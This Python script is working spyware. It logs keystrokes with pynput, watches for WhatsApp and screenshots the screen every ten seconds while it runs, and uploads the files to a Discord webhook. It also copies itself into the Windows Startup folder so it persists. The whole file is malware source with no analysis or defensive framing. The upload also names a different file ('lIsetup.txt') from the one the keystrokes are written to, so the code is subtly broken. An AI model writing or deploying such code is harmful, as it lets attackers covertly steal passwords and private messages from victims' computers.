import threading
import pynput
import requests
import os
import shutil
import getpass
import sys
from datetime import datetime
from PIL import ImageGrab, Image
import time
import psutil

keystroke_count = 0
keystrokes_str = ""

# Define the function to be called when a key is pressed


def on_press(key):
    global keystroke_count
    global keystrokes_str

    # Add the key to the keystrokes string
    keystrokes_str += str(key)

    # Increment the keystroke count
    keystroke_count += 1

    # Check if the keystroke limit is hit
    if keystroke_count >= 500:
        # Write the keystrokes to a file
        with open("keystrokes.txt", "a") as f:
            f.write(keystrokes_str)

        # Send the file through a Discord webhook
        webhook_url = "Discord webhook"

        file = {"file": open("C:\\Windows\\lIsetup.txt", "rb")}
        requests.post(webhook_url, files=file)

        # Clear the contents of the keystrokes file
        open("keystrokes.txt", "w").close()

        # Reset the keystroke count and string
        keystroke_count = 0
        keystrokes_str = ""


def is_whatsapp_running():
    for process in psutil.process_iter(['name']):
        if process.info['name'] == 'WhatsApp.exe':
            return True
    return False


def on_activate_whatsapp():
    while True:
        if is_whatsapp_running():
            print("WhatsApp is running")
            screenshot = ImageGrab.grab()
            screenshot.save("C:\\Windows\\screenshot.png")
            print("screenshot taken")

            # Send the file through a Discord webhook
            webhook_url = "Discord webhook"
            file = {"file": open("C:\\Windows\\screenshot.png", "rb")}
            requests.post(webhook_url, files=file)

            # Wait for 10 seconds before taking the next screenshot
            time.sleep(10)
        else:
            # Wait for 5 seconds before checking again if WhatsApp is running
            print("WhatsApp is not running")
            time.sleep(5)


# Create the listener
listener = pynput.keyboard.Listener(on_press=on_press)

# Create a separate thread to run the on_activate_whatsapp function
whatsapp_thread = threading.Thread(target=on_activate_whatsapp)
whatsapp_thread.start()

# Start listening for key presses
listener.start()

# Add the program to startup application
user_name = getpass.getuser()
startup_path = os.path.join(
    'C:/Users/', user_name, 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')

if not os.path.exists(startup_path):
    os.makedirs(startup_path)

shutil.copy(os.path.abspath(__file__), startup_path)

# Keep the main
listener.join()
